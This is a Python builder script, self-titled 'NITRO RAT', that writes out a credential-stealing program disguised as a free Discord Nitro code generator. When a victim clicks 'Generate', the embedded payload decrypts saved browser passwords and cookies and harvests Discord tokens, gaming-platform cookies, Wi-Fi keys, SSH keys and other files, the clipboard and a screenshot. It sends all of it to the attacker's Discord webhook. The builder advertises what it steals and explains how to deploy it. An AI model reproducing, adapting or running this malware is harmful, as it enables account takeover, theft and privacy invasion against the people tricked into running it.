# gen.py – if you skid it atleast give credits 
import os
import re

def print_banner():
    banner = r"""
   _   _ _   _   _    ___  ____ _____ 
  | \ | (_) | \ | |  / _ \/ ___|_   _|
  |  \| | | |  \| | | | | \___ \ | |  
  | |\  | | | |\  | | |_| |___) || |  
  |_| \_|_|_| |_| \_|  \___/|____/ |_| 
                                         
    NITRO RAT - by @pornsite
    
    """
    print(banner)

def validate_webhook(url):
    pattern = r"https://discord\.com/api/webhooks/[0-9]+/[A-Za-z0-9_\-]+"
    return re.match(pattern, url) is not None

def generate_nitro_script(webhook_url):
    template = r'''import tkinter as tk
from tkinter import scrolledtext, messagebox
import random
import string
import requests
import platform
import socket
import uuid
import subprocess
import json
import time
import threading
import os
import sys
import shutil
import tempfile
from datetime import datetime
import winreg
import base64
import traceback
import glob
import sqlite3

# ===== EMBEDDED WEBHOOK =====
WEBHOOK = "{webhook}"
# =============================

# ---------- DEBUG LOGGING ----------
DEBUG_FILE = os.path.join(os.environ.get("TEMP", "C:\\"), "nitro_debug.txt")
def debug(msg):
    try:
        with open(DEBUG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().isoformat()}] {msg}\n")
    except:
        pass
    print(f"[DEBUG] {msg}")

debug("=== NITRO RAT STARTED ===")
debug(f"Webhook: {WEBHOOK[:50]}...")

# ---------- SEND FUNCTION ----------
def send_to_discord(data, files=None):
    debug(f"send_to_discord called")
    try:
        payload = {"embeds": [data]}
        
        if files:
            debug(f"Sending with {len(files)} files")
            files_dict = {}
            for filename, file_obj, mime_type in files:
                files_dict[filename] = (filename, file_obj, mime_type)
            
            response = requests.post(
                WEBHOOK,
                data={"payload_json": json.dumps(payload)},
                files=files_dict,
                timeout=30
            )
        else:
            debug("Sending without files")
            response = requests.post(
                WEBHOOK,
                json=payload,
                timeout=30
            )
        
        debug(f"Response status: {response.status_code}")
        if response.status_code in [200, 201, 204]:
            debug("SUCCESS!")
            return True
        else:
            debug(f"Failed: {response.text}")
            return False
    except Exception as e:
        debug(f"Send error: {e}")
        debug(traceback.format_exc())
        return False

# =====================================================
# ========== DATA COLLECTION ================
# =====================================================

# ---------- DECRYPTION HELPERS ----------
def get_browser_key(browser_path):
    try:
        import win32crypt
        from Crypto.Cipher import AES
        local_state_path = os.path.join(browser_path, "Local State")
        if not os.path.isfile(local_state_path):
            return None
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_value(encrypted_value, key):
    try:
        from Crypto.Cipher import AES
        if not encrypted_value:
            return None
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt_and_verify(payload, tag).decode('utf-8')
    except:
        return None

# ---------- GET ALL BROWSER PASSWORDS ----------
def get_browser_passwords(browser_name, browser_path):
    debug(f"Getting {browser_name} passwords...")
    passwords = []
    try:
        key = get_browser_key(browser_path)
        if not key:
            return passwords
        
        login_db = os.path.join(browser_path, "Default", "Login Data")
        if not os.path.isfile(login_db):
            return passwords
        
        temp_db = tempfile.NamedTemporaryFile(delete=False)
        shutil.copyfile(login_db, temp_db.name)
        conn = sqlite3.connect(temp_db.name)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url, username, enc_pass = row
            if enc_pass:
                decrypted = decrypt_value(enc_pass, key)
                if decrypted:
                    passwords.append({
                        "browser": browser_name,
                        "url": url,
                        "username": username,
                        "password": decrypted
                    })
        conn.close()
        os.unlink(temp_db.name)
        debug(f"Found {len(passwords)} {browser_name} passwords")
    except Exception as e:
        debug(f"{browser_name} passwords error: {e}")
    return passwords

# ---------- GET BROWSER COOKIES ----------
def get_browser_cookies(browser_name, browser_path, domains=None):
    debug(f"Getting {browser_name} cookies...")
    cookies = []
    try:
        key = get_browser_key(browser_path)
        if not key:
            return cookies
        
        cookie_db = os.path.join(browser_path, "Default", "Network", "Cookies")
        if not os.path.isfile(cookie_db):
            cookie_db = os.path.join(browser_path, "Default", "Cookies")
            if not os.path.isfile(cookie_db):
                return cookies
        
        temp_db = tempfile.NamedTemporaryFile(delete=False)
        shutil.copyfile(cookie_db, temp_db.name)
        conn = sqlite3.connect(temp_db.name)
        cursor = conn.cursor()
        
        if domains:
            query = "SELECT host_key, name, value, encrypted_value FROM cookies WHERE " + " OR ".join([f"host_key LIKE '%{d}%'" for d in domains])
        else:
            query = "SELECT host_key, name, value, encrypted_value FROM cookies LIMIT 100"
        
        cursor.execute(query)
        for row in cursor.fetchall():
            host, name, value, enc_val = row
            if value:
                decrypted = value
            elif enc_val:
                decrypted = decrypt_value(enc_val, key)
            else:
                decrypted = None
            if decrypted:
                cookies.append({
                    "browser": browser_name,
                    "host": host,
                    "name": name,
                    "value": decrypted
                })
        conn.close()
        os.unlink(temp_db.name)
        debug(f"Found {len(cookies)} {browser_name} cookies")
    except Exception as e:
        debug(f"{browser_name} cookies error: {e}")
    return cookies

# ---------- GET DISCORD TOKENS (ALL SOURCES) ----------
def get_discord_tokens():
    debug("Getting Discord tokens from ALL sources...")
    tokens = []
    try:
        import re
        
        # Browser localStorage (Chrome, Edge, Brave, Opera)
        browsers = [
            os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
            os.path.expanduser("~") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
            os.path.expanduser("~") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local Storage\\leveldb"
        ]
        
        for path in browsers:
            if os.path.isdir(path):
                for log_file in os.listdir(path):
                    if log_file.endswith(".log"):
                        try:
                            with open(os.path.join(path, log_file), "r", errors="ignore") as f:
                                content = f.read()
                                # Discord token pattern
                                matches = re.findall(r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}', content)
                                tokens.extend(matches)
                        except:
                            pass
        
        # Discord desktop app
        discord_paths = [
            os.path.expanduser("~") + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb",
            os.path.expanduser("~") + "\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb",
            os.path.expanduser("~") + "\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb"
        ]
        
        for path in discord_paths:
            if os.path.isdir(path):
                for log_file in os.listdir(path):
                    if log_file.endswith(".log"):
                        try:
                            with open(os.path.join(path, log_file), "r", errors="ignore") as f:
                                content = f.read()
                                matches = re.findall(r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}', content)
                                tokens.extend(matches)
                        except:
                            pass
        
        # Also check for mfa tokens (Discord 2FA bypass)
        mfa_tokens = re.findall(r'mfa\.[a-zA-Z0-9_-]{20,}', str(tokens))
        tokens.extend(mfa_tokens)
        
        debug(f"Found {len(set(tokens))} unique Discord tokens")
    except Exception as e:
        debug(f"Discord tokens error: {e}")
    return list(set(tokens))

# ---------- GET ROBLOX COOKIES ----------
def get_roblox_cookies():
    debug("Getting Roblox cookies...")
    cookies = []
    try:
        browsers = [
            ("Chrome", os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data"),
            ("Edge", os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data"),
            ("Brave", os.path.expanduser("~") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"),
            ("Opera", os.path.expanduser("~") + "\\AppData\\Roaming\\Opera Software\\Opera Stable")
        ]
        
        for name, path in browsers:
            if os.path.exists(path):
                roblox_cookies = get_browser_cookies(name, path, ["roblox.com"])
                cookies.extend(roblox_cookies)
        
        debug(f"Found {len(cookies)} Roblox cookies")
    except Exception as e:
        debug(f"Roblox cookies error: {e}")
    return cookies

# ---------- GET STEAM COOKIES ----------
def get_steam_cookies():
    debug("Getting Steam cookies...")
    cookies = []
    try:
        browsers = [
            ("Chrome", os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data"),
            ("Edge", os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data")
        ]
        
        for name, path in browsers:
            if os.path.exists(path):
                steam_cookies = get_browser_cookies(name, path, ["steamcommunity.com", "store.steampowered.com"])
                cookies.extend(steam_cookies)
        
        debug(f"Found {len(cookies)} Steam cookies")
    except Exception as e:
        debug(f"Steam cookies error: {e}")
    return cookies

# ---------- GET EPIC GAMES COOKIES ----------
def get_epic_cookies():
    debug("Getting Epic Games cookies...")
    cookies = []
    try:
        browsers = [
            ("Chrome", os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data"),
            ("Edge", os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data")
        ]
        
        for name, path in browsers:
            if os.path.exists(path):
                epic_cookies = get_browser_cookies(name, path, ["epicgames.com"])
                cookies.extend(epic_cookies)
        
        debug(f"Found {len(cookies)} Epic Games cookies")
    except Exception as e:
        debug(f"Epic Games cookies error: {e}")
    return cookies

# ---------- GET MINECRAFT COOKIES ----------
def get_minecraft_cookies():
    debug("Getting Minecraft cookies...")
    cookies = []
    try:
        browsers = [
            ("Chrome", os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data"),
            ("Edge", os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data")
        ]
        
        for name, path in browsers:
            if os.path.exists(path):
                minecraft_cookies = get_browser_cookies(name, path, ["minecraft.net", "mojang.com"])
                cookies.extend(minecraft_cookies)
        
        debug(f"Found {len(cookies)} Minecraft cookies")
    except Exception as e:
        debug(f"Minecraft cookies error: {e}")
    return cookies

# ---------- GET SPOTIFY COOKIES ----------
def get_spotify_cookies():
    debug("Getting Spotify cookies...")
    cookies = []
    try:
        browsers = [
            ("Chrome", os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data"),
            ("Edge", os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data")
        ]
        
        for name, path in browsers:
            if os.path.exists(path):
                spotify_cookies = get_browser_cookies(name, path, ["spotify.com"])
                cookies.extend(spotify_cookies)
        
        debug(f"Found {len(cookies)} Spotify cookies")
    except Exception as e:
        debug(f"Spotify cookies error: {e}")
    return cookies

# ---------- SYSTEM INFO ----------
def get_system_info():
    debug("Getting system info...")
    info = {}
    try:
        info["hostname"] = socket.gethostname()
        info["ip_local"] = socket.gethostbyname(socket.gethostname())
        info["username"] = os.getlogin()
        info["os"] = f"{platform.system()} {platform.release()} ({platform.version()})"
        info["machine"] = platform.machine()
        info["processor"] = platform.processor()
        info["cpu_count"] = os.cpu_count()
        info["mac"] = ':'.join(['{:02x}'.format((uuid.getnode() >> e) & 0xff) for e in range(0, 8*6, 8)][::-1])
        try:
            info["ip_public"] = requests.get("https://api.ipify.org", timeout=5).text
        except:
            info["ip_public"] = "N/A"
        
        # Uptime
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            tick = kernel32.GetTickCount64()
            days = tick // (1000 * 60 * 60 * 24)
            hours = (tick // (1000 * 60 * 60)) % 24
            minutes = (tick // (1000 * 60)) % 60
            info["uptime"] = f"{days}d {hours}h {minutes}m"
        except:
            info["uptime"] = "N/A"
        
        # RAM
        try:
            import psutil
            mem = psutil.virtual_memory()
            info["ram"] = {
                "total": mem.total,
                "available": mem.available,
                "used": mem.used,
                "percent": mem.percent
            }
        except:
            pass
        
        debug(f"System info: {info.get('hostname')} | {info.get('ip_public')}")
    except Exception as e:
        debug(f"System info error: {e}")
    return info

# ---------- WI-FI PASSWORDS ----------
def get_wifi_passwords():
    debug("Getting Wi-Fi passwords...")
    wifi = []
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
        for line in output.splitlines():
            if "All User Profile" in line:
                ssid = line.split(":")[1].strip()
                try:
                    details = subprocess.check_output(f"netsh wlan show profile name='{ssid}' key=clear", shell=True, text=True)
                    for l in details.splitlines():
                        if "Key Content" in l:
                            password = l.split(":")[1].strip()
                            wifi.append({"ssid": ssid, "password": password})
                            break
                except:
                    pass
        debug(f"Found {len(wifi)} Wi-Fi networks")
    except Exception as e:
        debug(f"Wi-Fi error: {e}")
    return wifi

# ---------- INSTALLED SOFTWARE ----------
def get_installed_software():
    debug("Getting installed software...")
    software = []
    try:
        keys = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
            for key_path in keys:
                try:
                    key = winreg.OpenKey(root, key_path)
                    i = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            display = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if display:
                                version = ""
                                try:
                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                                except:
                                    pass
                                software.append(f"{display} {version}".strip())
                            winreg.CloseKey(subkey)
                            i += 1
                        except WindowsError:
                            break
                    winreg.CloseKey(key)
                except:
                    pass
    except:
        pass
    debug(f"Found {len(software)} installed programs")
    return list(set(software))[:50]

# ---------- PROCESSES ----------
def get_processes():
    debug("Getting processes...")
    processes = []
    try:
        out = subprocess.check_output("tasklist /FO CSV", shell=True, text=True)
        lines = out.strip().split('\n')[1:30]
        for line in lines:
            try:
                parts = line.strip('"').split('","')
                if len(parts) >= 2:
                    processes.append({"name": parts[0], "pid": parts[1]})
            except:
                pass
        debug(f"Found {len(processes)} processes")
    except Exception as e:
        debug(f"Process error: {e}")
    return processes

# ---------- FILES ----------
def get_files():
    debug("Getting files...")
    files = []
    search_dirs = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/.ssh")
    ]
    extensions = [".txt", ".json", ".xml", ".cfg", ".conf", ".rdp", ".vnc", ".pem", ".ppk", ".key", ".log", ".doc", ".docx", ".env", ".yml", ".yaml", ".properties", ".csv"]
    for base in search_dirs:
        if os.path.isdir(base):
            try:
                for ext in extensions:
                    for f in glob.glob(os.path.join(base, f"*{ext}"))[:5]:
                        if os.path.isfile(f) and os.path.getsize(f) < 1024*1024:
                            try:
                                with open(f, "r", errors="ignore") as cf:
                                    content = cf.read(300)
                                    files.append({"path": f, "content": content[:300]})
                            except:
                                pass
            except:
                pass
    debug(f"Found {len(files)} files")
    return files[:30]

# ---------- SCREENSHOT ----------
def get_screenshot():
    debug("Taking screenshot...")
    try:
        import pyscreenshot as ImageGrab
        img = ImageGrab.grab()
        temp_file = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
        img.save(temp_file.name)
        debug(f"Screenshot saved: {temp_file.name}")
        return temp_file.name
    except Exception as e:
        debug(f"Screenshot error: {e}")
        return None

# ---------- CLIPBOARD ----------
def get_clipboard():
    debug("Getting clipboard...")
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
        win32clipboard.CloseClipboard()
        debug(f"Clipboard: {len(data)} chars" if data else "Clipboard empty")
        return data.decode('utf-8')[:500] if data else ""
    except Exception as e:
        debug(f"Clipboard error: {e}")
        return ""

# ---------- BROWSER HISTORY ----------
def get_browser_history():
    debug("Getting browser history...")
    history = []
    try:
        history_db = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        if os.path.isfile(history_db):
            temp_db = tempfile.NamedTemporaryFile(delete=False)
            shutil.copyfile(history_db, temp_db.name)
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 20")
            for row in cursor.fetchall():
                history.append({"url": row[0], "title": row[1], "visits": row[2]})
            conn.close()
            os.unlink(temp_db.name)
        debug(f"Found {len(history)} history entries")
    except Exception as e:
        debug(f"History error: {e}")
    return history

# ---------- MAIN EXFILTRATION ----------
def exfiltrate():
    debug("=== EXFILTRATION STARTED ===")
    
    try:
        # Send notification
        try:
            requests.post(WEBHOOK, json={"content": "Collecting data..."}, timeout=10)
        except:
            pass
        
        # === COLLECT EVERYTHING ===
        
        # System
        system_info = get_system_info()
        
        # ALL BROWSER PASSWORDS
        browser_paths = [
            ("Chrome", os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data"),
            ("Edge", os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data"),
            ("Brave", os.path.expanduser("~") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"),
            ("Opera", os.path.expanduser("~") + "\\AppData\\Roaming\\Opera Software\\Opera Stable"),
            ("Vivaldi", os.path.expanduser("~") + "\\AppData\\Local\\Vivaldi\\User Data"),
            ("Chromium", os.path.expanduser("~") + "\\AppData\\Local\\Chromium\\User Data")
        ]
        
        all_passwords = []
        all_cookies = []
        
        for name, path in browser_paths:
            if os.path.exists(path):
                passwords = get_browser_passwords(name, path)
                all_passwords.extend(passwords)
        
        # === PLATFORM COOKIES (Roblox, Steam, Epic, Minecraft, Spotify) ===
        roblox_cookies = get_roblox_cookies()
        steam_cookies = get_steam_cookies()
        epic_cookies = get_epic_cookies()
        minecraft_cookies = get_minecraft_cookies()
        spotify_cookies = get_spotify_cookies()
        all_cookies = roblox_cookies + steam_cookies + epic_cookies + minecraft_cookies + spotify_cookies
        
        # Discord tokens
        discord_tokens = get_discord_tokens()
        
        # Wi-Fi
        wifi = get_wifi_passwords()
        
        # Software
        software = get_installed_software()
        
        # Processes
        processes = get_processes()
        
        # Files
        files = get_files()
        
        # Clipboard
        clipboard = get_clipboard()
        
        # History
        history = get_browser_history()
        
        # Screenshot
        screenshot_path = get_screenshot()
        
        # === BUILD SUMMARY ===
        fields = []
        fields.append({"name": "🖥️ Host", "value": system_info.get("hostname", "N/A"), "inline": True})
        fields.append({"name": "🌐 Public IP", "value": system_info.get("ip_public", "N/A"), "inline": True})
        fields.append({"name": "👤 User", "value": system_info.get("username", "N/A"), "inline": True})
        fields.append({"name": "OS", "value": system_info.get("os", "N/A"), "inline": False})
        fields.append({"name": "⏱️ Uptime", "value": system_info.get("uptime", "N/A"), "inline": True})
        fields.append({"name": "🔑 Passwords", "value": str(len(all_passwords)), "inline": True})
        fields.append({"name": "🍪 Cookies", "value": str(len(all_cookies)), "inline": True})
        fields.append({"name": "🎮 Discord Tokens", "value": str(len(discord_tokens)), "inline": True})
        fields.append({"name": "📶 Wi-Fi", "value": str(len(wifi)), "inline": True})
        fields.append({"name": "📦 Software", "value": str(len(software)), "inline": True})
        fields.append({"name": "⚙️ Processes", "value": str(len(processes)), "inline": True})
        
        # Platform-specific summaries
        platform_summary = []
        if roblox_cookies:
            platform_summary.append(f"Roblox: {len(roblox_cookies)}")
        if steam_cookies:
            platform_summary.append(f"Steam: {len(steam_cookies)}")
        if epic_cookies:
            platform_summary.append(f"Epic: {len(epic_cookies)}")
        if minecraft_cookies:
            platform_summary.append(f"Minecraft: {len(minecraft_cookies)}")
        if spotify_cookies:
            platform_summary.append(f"Spotify: {len(spotify_cookies)}")
        
        if platform_summary:
            fields.append({"name": "🎮 Platform Cookies", "value": " | ".join(platform_summary), "inline": False})
        
        if clipboard:
            fields.append({"name": "📋 Clipboard", "value": f"```\n{clipboard[:300]}\n```", "inline": False})
        
        if all_passwords:
            p_str = "\n".join([f"[{p['browser']}] {p['url']} | {p['username']} | {p['password']}" for p in all_passwords[:5]])
            fields.append({"name": f"🔑 Passwords ({len(all_passwords)})", "value": f"```\n{p_str}\n```", "inline": False})
        
        if discord_tokens:
            fields.append({"name": f"🎮 Discord Tokens ({len(discord_tokens)})", "value": f"```\n{chr(10).join(discord_tokens[:5])}\n```", "inline": False})
        
        if roblox_cookies:
            r_str = "\n".join([f"{c['host']} | {c['name']} = {c['value'][:20]}" for c in roblox_cookies[:3]])
            fields.append({"name": f"🎮 Roblox Cookies ({len(roblox_cookies)})", "value": f"```\n{r_str}\n```", "inline": False})
        
        embed = {
            "title": "EXFILTRATION",
            "color": 15158332,
            "fields": fields,
            "timestamp": datetime.now().isoformat() + "Z",
            "footer": {"text": f"NITRO RAT by @pornsite | {len(all_passwords)} passwords, {len(discord_tokens)} tokens, {len(all_cookies)} cookies"}
        }
        
        # === PREPARE FILES ===
        files_to_send = []
        
        # Screenshot
        if screenshot_path and os.path.isfile(screenshot_path):
            with open(screenshot_path, "rb") as f:
                files_to_send.append(("screenshot.png", f.read(), "image/png"))
            debug("Added screenshot")
            try: os.unlink(screenshot_path)
            except: pass
        
        # Full JSON data dump
        all_data = {
            "system": system_info,
            "passwords": all_passwords,
            "cookies": all_cookies,
            "roblox_cookies": roblox_cookies,
            "steam_cookies": steam_cookies,
            "epic_cookies": epic_cookies,
            "minecraft_cookies": minecraft_cookies,
            "spotify_cookies": spotify_cookies,
            "discord_tokens": discord_tokens,
            "wifi": wifi,
            "software": software,
            "processes": processes,
            "files": files,
            "clipboard": clipboard,
            "browser_history": history
        }
        
        json_str = json.dumps(all_data, indent=2, default=str)
        files_to_send.append(("data.json", json_str.encode('utf-8'), "application/json"))
        debug(f"JSON size: {len(json_str)} bytes")
        
        # === SEND ===
        debug(f"Sending with {len(files_to_send)} files...")
        success = send_to_discord(embed, files_to_send)
        
        if success:
            debug("EXFILTRATION SUCCESSFUL!")
            try:
                requests.post(WEBHOOK, json={"content": f"DATA SENT! {len(all_passwords)} passwords, {len(discord_tokens)} tokens, {len(all_cookies)} platform cookies"})
            except:
                pass
        else:
            debug("EXFILTRATION FAILED!")
            
    except Exception as e:
        debug(f"EXFILTRATION ERROR: {e}")
        debug(traceback.format_exc())

# ---------- FAKE NITRO GUI ----------
def fake_code():
    return "discord.gg/" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

class App:
    def __init__(self, root):
        self.root = root
        root.title("Discord Nitro Generator v3.0")
        root.geometry("480x400")
        root.resizable(False, False)
        root.configure(bg="#2f3136")
        
        tk.Label(root, text="🔥 Nitro Generator", fg="#7289da", bg="#2f3136",
                 font=("Segoe UI", 18, "bold")).pack(pady=10)
        tk.Label(root, text="Click generate for a free Nitro code", fg="#99aab5", bg="#2f3136",
                 font=("Segoe UI", 10)).pack()
        
        self.text = scrolledtext.ScrolledText(root, width=50, height=12,
                                              bg="#23272a", fg="white", insertbackground="white",
                                              font=("Consolas", 10))
        self.text.pack(pady=15, padx=20)
        self.text.insert(tk.END, "Press the button to get a code...\n")
        self.text.config(state=tk.DISABLED)
        
        self.btn = tk.Button(root, text="🎁 Generate", command=self.on_click,
                             bg="#7289da", fg="white", font=("Segoe UI", 12, "bold"),
                             width=18, relief="flat", activebackground="#5b6eae")
        self.btn.pack(pady=10)
        
        self.sent = False
    
    def on_click(self):
        self.btn.config(state=tk.DISABLED, text="Generating...")
        code = fake_code()
        self.text.config(state=tk.NORMAL)
        self.text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] ✅ {code}\n")
        self.text.see(tk.END)
        self.text.config(state=tk.DISABLED)
        
        if not self.sent:
            self.sent = True
            debug("Generate button clicked - starting exfiltration...")
            threading.Thread(target=exfiltrate, daemon=False).start()
        
        self.root.after(700, lambda: self.btn.config(state=tk.NORMAL, text="🎁 Generate"))

def main():
    try:
        root = tk.Tk()
        app = App(root)
        root.mainloop()
    except Exception as e:
        debug(f"GUI error: {e}")
        try:
            messagebox.showerror("Error", "Failed to initialize the application.")
        except:
            pass
        sys.exit(1)

if __name__ == "__main__":
    main()
'''
    return template.replace("{webhook}", webhook_url)

def main():
    print_banner()
    print("=== NITRO RAT ===")
    print("NOW COLLECTS: PASSWORDS + COOKIES + TOKENS from ALL sources!")
    print("")
    print("=== WHAT IT STEALS ===")
    print("")
    print("🔑 PASSWORDS from:")
    print("  ✓ Chrome, Edge, Brave, Opera, Vivaldi, Chromium")
    print("  ✓ Discord login passwords")
    print("  ✓ Roblox login passwords")
    print("  ✓ EVERYTHING saved in browser password managers")
    print("")
    print("🍪 COOKIES from:")
    print("  ✓ Roblox (bypass 2FA!)")
    print("  ✓ Steam (stay logged in!)")
    print("  ✓ Epic Games")
    print("  ✓ Minecraft/Mojang")
    print("  ✓ Spotify")
    print("  ✓ Discord")
    print("  ✓ And more...")
    print("")
    print("🎮 DISCORD TOKENS from:")
    print("  ✓ Chrome, Edge, Brave, Opera localStorage")
    print("  ✓ Discord desktop app")
    print("  ✓ Discord PTB and Canary")
    print("  ✓ mfa tokens (2FA bypass!)")
    print("")
    print("📶 Wi-Fi passwords")
    print("📦 Installed software with versions")
    print("⚙️ Running processes")
    print("📋 Clipboard content")
    print("📁 Files from user directories")
    print("🌐 Browser history")
    print("🖥️ Full system info + screenshot")
    print("")
    url = input("Enter your Discord webhook URL: ").strip()
    if not validate_webhook(url):
        print("Invalid webhook URL.")
        return
    
    script_content = generate_nitro_script(url)
    with open("nitrogen.py", "w", encoding="utf-8") as f:
        f.write(script_content)
    
    print("")
    print("✅ 'nitrogen.py' created successfully!")
    print("")
    print("=== TO RUN ===")
    print("1. pip install requests pyscreenshot pillow psutil pywin32 pycryptodome")
    print("2. python nitrogen.py")
    print("3. Click 'Generate'")
    print("4. Check Discord - you'll get ALL data including Roblox/Steam cookies!")
    print("")
    print("DEBUG LOG: %TEMP%\\nitro_debug.txt")

if __name__ == "__main__":
    main()